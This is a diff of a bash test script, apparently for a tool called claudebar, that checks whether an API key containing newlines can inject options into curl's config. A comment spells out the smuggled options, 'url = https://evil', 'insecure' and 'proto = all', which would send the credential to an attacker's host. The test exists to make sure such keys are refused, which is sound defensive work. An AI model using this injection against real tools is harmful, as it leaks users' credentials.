@@ -86,12 +86,12 @@ _run_hostile "3MB usage cache"     _h_big_cache
 _run_hostile "3MB credentials"     _h_big_creds
 _run_hostile "3MB omarchy theme"   _h_big_theme
 # --- a token that tries to inject options into curl's config file ---
-# The bearer reaches curl through `--config -`, and that parser is line
+# The dispenser key reaches curl through `--config -`, and that parser is line
 # oriented: a newline inside a value ends the line and the rest parses as fresh
 # options. `url = https://evil` plus `insecure` is a second transfer carrying
 # the credential to a host the attacker picked, and `proto = all` cancels the
-# --proto '=https' on the command line. Writing the credentials file is exactly
-# the threat this review is about, so the token must be REFUSED, not escaped:
+# --proto on the command line. Writing the key file is exactly the threat this
+# review is about, so the key must be REFUSED, not escaped:
 # what reaches curl must never contain an option line.
 _run_injection() { # <label> <token> [expect-header]
     local label="$1" token="$2" want_hdr="${3:-no}" home cfg sent
@@ -110,8 +110,9 @@ _run_injection() { # <label> <token> [expect-header]
         > "$home/.claude/.credentials.json"
     printf '%s' '{"oauthAccount":{"organizationUuid":"org-test"}}' > "$home/.claude.json"
     printf '%s' "$GOOD" > "$home/.cache/claudebar/oe/usage.json"
+    printf '%s' "$token" > "$home/dispenser-key"
     # --refresh so the usage fetch runs instead of being served from cache.
-    OUT=$(run_pinned "$home" env CLAUDEBAR_TEST_NET_RETRY_DELAY=0 \
+    OUT=$(run_pinned "$home" env CLAUDEBAR_DISPENSER_KEY_FILE="$home/dispenser-key" CLAUDEBAR_TEST_NET_RETRY_DELAY=0 \
             CLAUDEBAR_TEST_NET_QUICK_BUDGET=0 CLAUDEBAR_TEST_NET_LONG_BUDGET=0 \
             timeout 20 "$SCRIPT" --refresh); RC=$?
     sent=""; [[ -f "$cfg" ]] && sent=$(cat "$cfg")
@@ -128,9 +129,9 @@ _run_injection() { # <label> <token> [expect-header]
     # The positive control proves the stub really does capture the config, so a
     # clean result above means "refused", never "the harness saw nothing".
     if [[ "$want_hdr" == "yes" ]]; then
-        grep -q 'Authorization: Bearer' <<< "$sent" \
-            && _ok "$label: bearer header still sent" \
-            || _no "$label: bearer header still sent" "config was: $sent"
+        grep -q 'x-api-key: ' <<< "$sent" \
+            && _ok "$label: key header still sent" \
+            || _no "$label: key header still sent" "config was: $sent"
     fi
     assert_exit0 "$label: exit 0"
     assert_json_valid "$label: valid JSON"
